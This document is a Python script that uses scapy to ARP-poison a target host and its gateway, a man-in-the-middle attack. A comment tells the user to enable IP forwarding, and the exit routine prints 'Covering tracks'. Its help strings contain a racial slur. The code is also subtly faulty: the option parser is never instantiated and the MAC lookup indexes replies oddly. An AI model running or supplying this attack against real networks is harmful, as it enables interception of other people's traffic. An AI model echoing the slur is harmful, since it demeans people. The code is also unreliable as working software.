#post running requirement echo 1 > /proc/sys/net/ipv4/ip_forward
import scapy.all as scapy
import time
import optparse
def inputs():
    parse_obj = optparse.OptionParser
    
    parse_obj.add_option("-t", "--target", dest = "target", help="Enter target IP nigga")
    parse_obj.add_option("-g", "--gateway", dest = "gateway", help="Enter gateway IP nigga")
    opt = parse_obj.parse_args() [0]
    
    if not opt.target:
        print("Enter target IP")
    if not opt.gateway:
        print("Enter gateway IP")
    
    return opt


def poison(target,poisoned):
    
    mac = getmac(target)
    response = scapy.ARP(op=2, pdst=target, hwdst = mac, psrc=poisoned)
    scapy.send(response,verbose=False)


def reset(target, poisoned):
    macTarget = getmac(target)
    macPoisoned = getmac(poisoned)
    response = scapy.ARP(op=2, pdst=target, hwdst=macTarget, psrc=poisoned, hwsrc=macPoisoned)
    scapy.send(response, verbose=False, count=6)

def getmac(ip):
    arp_request = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())
    combine = broadcast/arp_request
    answered = scapy.srp(combine, timeout=1, verbose=False)
    return answered[0][1].hwsrc

num = 0

ips = inputs()
target = ips.target
gateway = ips.gateway

try:
    while True:
        poison(gateway, target)
        poison(target, gateway)
        num += 2
        print("\rPackets are sent" + str(num), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("Quiting the program\n")
    print("Covering tracks")
    reset(gateway, target)
    reset(target, gateway)


#python arp_poison.py -t 10.0.2.15 -g 10.0.2.1
